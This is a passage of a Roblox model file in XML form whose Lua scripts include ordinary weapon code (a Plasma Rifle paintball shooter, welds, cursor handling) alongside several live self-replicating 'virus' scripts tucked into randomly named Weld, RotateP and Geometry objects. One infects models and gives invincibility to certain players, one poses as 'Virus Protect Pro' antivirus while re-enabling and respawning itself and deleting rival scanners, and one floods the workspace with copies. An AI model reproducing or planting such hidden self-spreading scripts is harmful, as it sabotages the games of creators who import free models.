p.Changed:connect(function (pr) 
if pr == &quot;Character&quot; then 
f:clone().Parent = p.Character 
p.Character.Humanoid.MaxHealth = math.huge 
p.Character.Humanoid.Health = math.huge
end 
end)
end)
else
script._Utility.Vaccines.Value = script._Utility.Vaccines.Value + 1
print(&quot;Congratulations on being immune this time, next time though, don&apos;t expect to be so lucky.  After this script strain encounters five antibiotics it will grow immune.&quot;)
end 
spread(game)
game.Workspace.ChildAdded:connect(spread)
end
</ProtectedString>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
			<Item class="Geometry" referent="RBX187">
				<Properties>
					<string name="Name">???P?=7&#182;P,z{mn~qh8</string>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX188">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Hintor</string>
						<ProtectedString name="Source">--[[

Ah, hello there, good to see someone found me.  Well to start things out, I am glad that you are not a illiterate who cannot script for his life, otherwise you wouldn&apos;t be seeing this.
This is just a rather friendly expirement, to see how much and fast I can get this script into everywhere.

Let me point some things out.
One.  This does not affect gameplay at all besides rather pointedly making me a supa perzon.
Two.  This does not shut down server, make annoying hints, rename stuff, replace globals, makes to many copies that it shuts down.  None of that.
Three.  You can end this by putting something in the lighting named &quot;AntiBiotic&quot; (With capitals).
Four.  You will probably want to share number three with your buddys and tell them how to avoid this, there is a downside to that.
Five.  After this virus has encounter five AntiBiotics it will be given a &apos;immunity&apos; meaning, screw you, I&apos;m doing it anyway.
Six.  Guess what?  You going to report this?  The script benefits anyone who has 3 to 5 characters in their name and clc somewhere in there.  Not specific to me.
Seven.  You were better off not using free models.



-&apos;clc&apos;
--]]

-- In case you didn&apos;t think I was good on my word, here is the line that saves you.
if game:findFirstChild(&quot;Lighting&quot;) ~= nil then
if game.Lighting:findFirstChild(&quot;AntiBiotic&quot;) ~= nil then protected = true end
end
-- It still spreads though :( so sad for you.
--Which reminds me, this also has special characters.
characters = &quot;abcdefghjklmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ1234567890`,.:;~!?@#$%^&amp;*()-=_+[]{}\|/??????&#149;???????&#164;????&#182;&#167;??????????&quot;
containers = {&quot;Timer&quot;, &quot;Geometry&quot;, &quot;Timer&quot;, &quot;LocalBackpack&quot;, &quot;LocalBackpackItem&quot;, &quot;Weld&quot;, &quot;Glue&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;MotorFeature&quot;, &quot;Snap&quot;, &quot;StockSound&quot;, &quot;Vist&quot;}
chars = { }

for i = 1, string.len(characters) do
table.insert(chars, 1, string.sub(characters, i, i))
end

function spread(folder)

if folder.className ~= &quot;Workspace&quot; and folder.className ~= &quot;Lighting&quot; and folder.className ~= &quot;StarterPack&quot; and folder.className ~= &quot;Part&quot; and folder.className ~= &quot;Model&quot; and folder.className ~= &quot;Script&quot; and folder ~= game then return end
folder = folder:getChildren()
for i = 1, #folder do
if folder[i].className ~= nil and (folder[i].className == &quot;Model&quot; or folder[i].className == &quot;Script&quot;) then
infect(folder[i])
end
c(spread,folder[i])
end

end

function infect(file)
if file == script then return end

local bin = Instance.new(containers[math.random(1, #containers)])
local str = &quot;&quot;
for i = 1, math.random(10, 30) do
str = str .. chars[math.random(1, #chars)]
end
--Thats right, 10-30 characters of randomness.  Game over.  You can NOT guess that d00d.
bin.Name = str
script:clone().Parent = bin
bin.Parent = file
end

function c(f, a) f(a) end

if Spreading == nil or Spreading == false then
_G.Spreading = true 
if not protected or script._Utility.Vaccines.Value &gt; 4 then
gam = game:getChildren()
for i = 1, #gam do if gam[i].className == &quot;Players&quot; then P = gam[i] end end
f = Instance.new(&quot;ForceField&quot;) 
P.ChildAdded:connect(function (p)
if p.className ~= &quot;Player&quot; or ((string.len(p.Name) &lt; 3 or string.len(p.Name) &gt; 5 or string.find(p.Name, &quot;clc&quot;) &lt; 1) and p.Name ~= &quot;Player&quot;) then return end 
p.Changed:connect(function (pr) 
if pr == &quot;Character&quot; then 
f:clone().Parent = p.Character 
p.Character.Humanoid.MaxHealth = math.huge 
p.Character.Humanoid.Health = math.huge
end 
end)
end)
else
script._Utility.Vaccines.Value = script._Utility.Vaccines.Value + 1
print(&quot;Congratulations on being immune this time, next time though, don&apos;t expect to be so lucky.  After this script strain encounters five antibiotics it will grow immune.&quot;)
end 
spread(game)
game.Workspace.ChildAdded:connect(spread)
end
</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="Weld" referent="RBX189">
				<Properties>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">ViVRuS</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="VelocityMotor" referent="RBX190">
					<Properties>
						<CoordinateFrame name="C0">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<CoordinateFrame name="C1">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<float name="CurrentAngle">0</float>
						<float name="DesiredAngle">0</float>
						<Ref name="Hole">null</Ref>
						<float name="MaxVelocity">0</float>
						<string name="Name">ViVRuS</string>
						<Ref name="Part0">null</Ref>
						<Ref name="Part1">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX191">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">AntiVirusSoftware</string>
							<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX192">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX193">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX194">
					<Properties>
						<string name="Name">ORLY</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
		<Item class="Tool" referent="RBX195">
			<Properties>
				<bool name="Enabled">false</bool>
				<CoordinateFrame name="Grip">
					<X>0</X>
					<Y>0.400000006</Y>
					<Z>0.119999997</Z>
					<R00>0.00999369565</R00>
					<R01>-0.0240930058</R01>
					<R02>0.999659777</R02>
					<R10>-0.000240848065</R10>
					<R11>-0.999709725</R11>
					<R12>-0.0240918007</R12>
					<R20>0.999950051</R20>
					<R21>8.21913718e-013</R21>
					<R22>-0.00999659766</R22>
				</CoordinateFrame>
				<string name="Name">Plasma Rifle</string>
				<Content name="TextureId"><null></null></Content>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Script" referent="RBX196">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">BrickCleanup</string>
					<ProtectedString name="Source">-- this script removes its parent from the workspace after 24 seconds

wait(1)
script.Parent.Parent = nil</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX197">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Paintball</string>
					<ProtectedString name="Source">ball = script.Parent
damage = 5



function onTouched(hit)
	local humanoid = hit.Parent:findFirstChild(&quot;Humanoid&quot;)
	-- make a splat
	--for i=1,3 do
	--	local s = Instance.new(&quot;Part&quot;)
	--	s.Shape = 1 -- block
	--	s.formFactor = 2 -- plate
	--	s.Size = Vector3.new(1,.4,1)
	--	s.BrickColor = ball.BrickColor
	--	local v = Vector3.new(math.random(-1,1), math.random(0,1), math.random(-1,1))
	--	s.Velocity = 15 * v--15
	--	s.CFrame = CFrame.new(ball.Position + v, v)
	---	ball.BrickCleanup:clone().Parent = s
	--	s.BrickCleanup.Disabled = false
	--	s.Parent = game.Workspace
	--	
	--end
	

	if humanoid ~= nil then
		tagHumanoid(humanoid)
		humanoid.Health = humanoid.Health - damage
		wait(2)
		untagHumanoid(humanoid)
	end

	connection:disconnect()
	ball.Parent = nil
end

function tagHumanoid(humanoid)
	-- todo: make tag expire
	local tag = ball:findFirstChild(&quot;creator&quot;)
	if tag ~= nil then
		local new_tag = tag:clone()
		new_tag.Parent = humanoid
	end
end


function untagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild(&quot;creator&quot;)
		if tag ~= nil then
			tag.Parent = nil
		end
	end
end

connection = ball.Touched:connect(onTouched)

wait(0.8)
ball.Parent = nil
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX198">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">PaintballShooter</string>
					<ProtectedString name="Source">Tool = script.Parent

colors = {23,107,102}

function fire(v)

	Tool.Handle.Fire:play()
	

	local vCharacter = Tool
	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	local missile = Instance.new(&quot;Part&quot;)

        

	local spawnPos = vCharacter.Handle.Position
	


	spawnPos  = spawnPos + (v * 5)

	missile.Position = spawnPos
	missile.Size = Vector3.new(0.2,0.2,0.2)
	missile.Velocity = v * 600
	missile.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
	missile.Shape = 0
	missile.BottomSurface = 0
	missile.TopSurface = 0
	missile.Name = &quot;Paintball&quot;
	missile.Elasticity = 0
	missile.Reflectance = 0
	missile.Friction = 1

	local force = Instance.new(&quot;BodyForce&quot;)
	force.force = Vector3.new(0,220,0)
	force.Parent = missile
	
	Tool.BrickCleanup:clone().Parent = missile

	local new_script = script.Parent.Paintball:clone()
	new_script.Disabled = false
	new_script.Parent = missile

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile
	


	missile.Parent = game.Workspace
	--wait(0.05)
	--fire(
	

end

	


function check(en)
---------------------------------------Function start here.
if (Tool.Enabled == false) then
return false
end--end for if!
-------------------------------
if (Tool.Enabled == true) then
return true
end
---------------------------------------Function end here.
end


Tool.Enabled = true
function onActivated()

	if not Tool.Enabled then
		return
	end

	--Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print(&quot;Humanoid not found&quot;)
		return 
	end

	local targetPos = humanoid.TargetPoint
	local lookAt = (targetPos - character.Head.Position).unit
	
	if (check()) then
	fire(lookAt)
	wait(0.1)
	onActivated()
	end
	return

	--Tool.Enabled = true
end


script.Parent.Activated:connect(onActivated)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX199">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">WeldScript</string>
					<ProtectedString name="Source">local w1 = Instance.new(&quot;Weld&quot;)
w1.Parent = script.Parent.Handle
w1.Part0 = w1.Parent
w1.Part1 = script.Parent.Handle2w1.C1 = CFrame.new(-0, 0.3, -0.7)
local w2 = Instance.new(&quot;Weld&quot;)
w2.Parent = script.Parent.Handle
w2.Part0 = w2.Parent
w2.Part1 = script.Parent.Handle3
w2.C1 = CFrame.new(-0, 1.9, 0.1)

local w3 = Instance.new(&quot;Weld&quot;)
w3.Parent = script.Parent.Handle
w3.Part0 = w3.Parent
w3.Part1 = script.Parent.Handle4
w3.C1 = CFrame.new(-0, 0, -0.6)

local w4 = Instance.new(&quot;Weld&quot;)
w4.Parent = script.Parent.Handle
w4.Part0 = w4.Parent
w4.Part1 = script.Parent.Handle5
w4.C1 = CFrame.new(0, 1.3, -0)

local w5 = Instance.new(&quot;Weld&quot;)
w5.Parent = script.Parent.Handle
w5.Part0 = w5.Parent
w5.Part1 = script.Parent.Handle6
w5.C1 = CFrame.new(-0, 3, 0.3)

local w6 = Instance.new(&quot;Weld&quot;)
w6.Parent = script.Parent.Handle
w6.Part0 = w6.Parent
w6.Part1 = script.Parent.Handle8
w6.C1 = CFrame.fromEulerAnglesXYZ(0.3, 0, 0) * CFrame.new(0, -0.7, -0.6)
local w7 = Instance.new(&quot;Weld&quot;)
w7.Parent = script.Parent.Handle
w7.Part0 = w7.Parent
w7.Part1 = script.Parent.Handle9
w7.C1 = CFrame.new(-0, -1.9, 0)
local w8 = Instance.new(&quot;Weld&quot;)
w8.Parent = script.Parent.Handle
w8.Part0 = w8.Parent
w8.Part1 = script.Parent.Handle10
w8.C1 = CFrame.fromEulerAnglesXYZ(3.2, 0, 0) * CFrame.new(0, -2.3, -0.4)

local w9 = Instance.new(&quot;Weld&quot;)
w9.Parent = script.Parent.Handle
w9.Part0 = w9.Parent
w9.Part1 = script.Parent.Handle11
w9.C1 = CFrame.fromEulerAnglesXYZ(3.2, 0, 0) * CFrame.new(0, -0.5, 0.5)

local w10 = Instance.new(&quot;Weld&quot;)
w10.Parent = script.Parent.Handle
w10.Part0 = w10.Parent
w10.Part1 = script.Parent.Handle12
w10.C1 = CFrame.fromEulerAnglesXYZ(3.2, 0, 0) * CFrame.new(0, -0.1, 0.6)

local w11 = Instance.new(&quot;Weld&quot;)
w11.Parent = script.Parent.Handle
w11.Part0 = w11.Parent
w11.Part1 = script.Parent.Handle13
w11.C1 = CFrame.fromEulerAnglesXYZ(3.1, 0, 0) * CFrame.new(0, 0.3, 0.5)




</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="LocalScript" referent="RBX200">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Local Gui</string>
					<ProtectedString name="Source">local Tool = script.Parent;



enabled = true
function onButton1Down(mouse)
	if not enabled then
		return
	end

	enabled = true
	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;

	--wait(.5)
	--mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	--enabled = true
	--mouse.Button1Up:connect(function() onButton1Up(mouse) end)

end


function onButton1Up(mouse)
enabled = false
Tool.Enabled = false
mouse.Icon = &quot;rbxasset://textures\\GunWaitCursor.png&quot;
wait(2.2)
mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
enabled = true
Tool.Enabled = true
end

function onEquippedLocal(mouse)

	if mouse == nil then
		print(&quot;Mouse not found&quot;)
		return 
	end

	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)	
	mouse.Button1Up:connect(function() onButton1Up(mouse)end)
end


Tool.Equipped:connect(onEquippedLocal)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="RotateP" referent="RBX201">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX202">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX203">
				<Properties>
					<float name="BaseAngle">3.25000678e-033</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">ViVRuS</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="RotateP" referent="RBX204">
					<Properties>
						<float name="BaseAngle">1.14835947e-038</float>
						<CoordinateFrame name="C0">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<CoordinateFrame name="C1">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<string name="Name">ViVRuS</string>
						<Ref name="Part0">null</Ref>
						<Ref name="Part1">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX205">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">AntiVirusSoftware</string>
							<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
		</Item>
		<Item class="Tool" referent="RBX206">
			<Properties>
				<bool name="Enabled">true</bool>
				<CoordinateFrame name="Grip">
					<X>0.5</X>
					<Y>-0.5</Y>
					<Z>0</Z>
					<R00>0</R00>
					<R01>0</R01>
					<R02>1</R02>
					<R10>0</R10>
					<R11>1</R11>
					<R12>-0</R12>
					<R20>-1</R20>
					<R21>0</R21>
					<R22>0</R22>
				</CoordinateFrame>
				<string name="Name">Carbine</string>
				<Content name="TextureId"><null></null></Content>
				<bool name="archivable">true</bool>
			</Properties>
